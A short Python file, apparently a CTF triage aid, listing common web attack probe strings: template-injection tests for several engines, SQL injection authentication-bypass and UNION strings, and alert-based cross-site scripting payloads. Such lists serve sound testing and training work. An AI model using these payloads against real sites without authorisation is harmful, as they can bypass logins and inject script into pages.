# Quick payload lists for CTF triage

SSTI_PAYLOADS = [
    "{{7*7}}",               # Jinja2 / Twig
    "${7*7}",                # FreeMarker / Java EL
    "<%= 7*7 %>",            # ERB (Ruby)
    "#{7*7}",                # Ruby string interpolation
    "{7*7}",                 # Smarty
    "{{= 7*7}}"              # doT.js
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1-- -",
    "\" OR 1=1-- -",
    "' UNION SELECT NULL,NULL-- -",
    "admin'--"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)"
]
